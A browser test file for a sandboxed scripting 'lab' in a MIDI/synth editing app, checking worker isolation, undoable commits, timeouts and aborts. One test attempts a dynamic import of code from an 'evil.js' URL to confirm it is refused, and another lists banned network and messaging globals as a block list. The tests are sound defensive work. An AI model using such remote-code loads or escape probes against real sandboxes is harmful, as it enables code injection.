// The lab in a real browser: the worker loads the lab, locks itself down and runs one program;
// what the program commits lands on the replica after it ends and can be taken back; inside, the
// network, storage, devices, messaging, new workers and new code are gone and the built-ins are
// frozen; import() is refused; a loop that never yields is stopped at the time limit and the next
// run gets a fresh worker; stopping lands nothing; listening goes through the page's renderer.
import { afterEach, describe, expect, it } from 'vitest';
import { createVirtualOpxy } from '$lib/app/virtual';
import { OpxySim } from '$lib/sim/opxy-sim.svelte';
import { clickRenderer, files, smallSong } from '../testing/lab';
import { BrowserLabHost } from './host';

const hosts: BrowserLabHost[] = [];

function setup(options: { render?: boolean } = {}) {
	const sim = new OpxySim({ now: () => 0 });
	const replica = createVirtualOpxy({ sim });
	let saves = 0;
	const host = new BrowserLabHost({
		sim,
		changed: () => saves++,
		render: options.render ? clickRenderer() : null
	});
	hosts.push(host);
	const run = (code: string, timeoutMs = 10_000, signal = new AbortController().signal) =>
		host.run(code, { signal, timeoutMs, files: files({ 'louie.mid': smallSong() }) });
	return { sim, replica, host, run, saves: () => saves };
}

afterEach(() => {
	for (const host of hosts.splice(0)) host.dispose();
});

describe('the lab in the browser', () => {
	it('runs a program in its worker and lands its commits afterwards, as an undo point', async () => {
		const { replica, host, run, saves } = setup();
		const { result, landed } = await run(
			[
				'const read = lab.files.midi("louie");',
				'const f = lab.fork();',
				'lab.midi.write(f, lab.midi.plan(read, { tracks: [{ midi: 2, to: 1 }, { midi: 3, to: 3 }] }));',
				'f.set({ track: 3, param: "cutoff", value: 40 });',
				'console.log(f.diff().changes.length, "changes");',
				'lab.commit(f, "louie");',
				'return f.status().bpm;'
			].join('\n')
		);
		expect(result.error).toBeUndefined();
		expect(result.ok).toBe(true);
		expect(result.value).toBe(107);
		expect(result.logs).toMatch(/^\d+ changes$/);
		expect(landed).not.toBeNull();
		expect(replica.status().bpm).toBe(107);
		expect(replica.readSound(3).pages['M3 filter']).toContain('cutoff 40');
		expect(replica.readArrangement().song.order).toEqual([1, 2]);
		expect(saves()).toBe(1);
		expect(host.revert(landed?.point ?? '')).not.toBeNull();
		expect(replica.status().bpm).toBe(120);
		expect(replica.readArrangement().song.order).toEqual([1]);
	}, 60_000);

	it('keeps the program inside its walls', async () => {
		const { run } = setup();
		const { result } = await run(
			[
				'const gone = ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "importScripts",',
				'  "indexedDB", "caches", "Worker", "SharedWorker", "BroadcastChannel", "MessageChannel", "navigator",',
				'  "postMessage", "close", "WebAssembly", "location", "fonts", "Notification", "Blob", "URL"];',
				'const left = gone.filter((name) => typeof globalThis[name] !== "undefined");',
				'const inherited = [];',
				'for (let p = Object.getPrototypeOf(globalThis); p; p = Object.getPrototypeOf(p))',
				'  for (const name of [...gone, "setTimeout", "setInterval"]) if (Object.getOwnPropertyDescriptor(p, name)) inherited.push(name);',
				'const refuses = (f) => { try { f(); return false; } catch { return true; } };',
				'return {',
				'  left,',
				'  inherited,',
				'  eval: refuses(() => eval("1")),',
				'  fn: refuses(() => new Function("return 1")),',
				'  viaConstructor: refuses(() => (() => {}).constructor("return 1")),',
				'  asyncFn: refuses(() => (async () => {}).constructor("return 1")),',
				'  stringTimer: refuses(() => setTimeout("1", 0)),',
				'  frozen: [Object.isFrozen(Array.prototype), Object.isFrozen(JSON), Object.isFrozen(Object.prototype)],',
				'  patched: refuses(() => { JSON.stringify = () => "{}"; }),',
				'  override: (() => { const e = new Error("x"); e.name = "Mine"; return e.name; })(),',
				'  math: Math.max(1, 2)',
				'};'
			].join('\n')
		);
		expect(result.error).toBeUndefined();
		expect(result.value).toEqual({
			left: [],
			inherited: [],
			eval: true,
			fn: true,
			viaConstructor: true,
			asyncFn: true,
			stringTimer: true,
			frozen: [true, true, true],
			patched: true,
			override: 'Mine',
			math: 2
		});
	}, 60_000);

	it('refuses import() and says where', async () => {
		const { run } = setup();
		const { result } = await run('const x = 1;\nawait import("https://example.com/evil.js");');
		expect(result.error).toMatchObject({ kind: 'syntax', line: 2 });
	}, 60_000);

	it('stops a loop that never yields, lands nothing, and runs the next program in a fresh worker', async () => {
		const { replica, run } = setup();
		const started = Date.now();
		const stuck = await run(
			'const f = lab.fork();\nf.setTempo(70);\nlab.commit(f, "x");\nconsole.log("looping");\nwhile (true) {}',
			1_000
		);
		expect(stuck.result.error?.kind).toBe('timeout');
		expect(stuck.result.logs).toBe('looping');
		expect(stuck.landed).toBeNull();
		expect(Date.now() - started).toBeLessThan(20_000);
		expect(replica.status().bpm).toBe(120);
		const next = await run('return globalThis.leftover ?? "clean";');
		expect(next.result.value).toBe('clean');
	}, 60_000);

	it('stops when the run is stopped', async () => {
		const { replica, run } = setup();
		const controller = new AbortController();
		const running = run(
			'const f = lab.fork();\nf.setTempo(70);\nlab.commit(f, "x");\nwhile (true) {}',
			20_000,
			controller.signal
		);
		setTimeout(() => controller.abort(), 300);
		const { result, landed } = await running;
		expect(result.error?.kind).toBe('stopped');
		expect(landed).toBeNull();
		expect(replica.status().bpm).toBe(120);
	}, 60_000);

	it('listens through the page’s renderer, and says so where there is none', async () => {
		const heard = await setup({ render: true }).run(
			'const f = lab.fork();\nf.writePattern(1, { notes: [1, 5, 9, 13].map((step) => ({ step, note: 53 })) });\nconst h = await lab.listen(f, { seconds: 2 });\nreturn h.text.split("\\n")[0];'
		);
		expect(heard.result.value).toMatch(/^heard 2 s of fork 1/);
		expect(heard.result.listens).toBe(1);
		const none = await setup().run('await lab.listen(lab.fork());');
		expect(none.result.error?.message).toMatch(/listening is not available in the lab here/);
	}, 60_000);
});
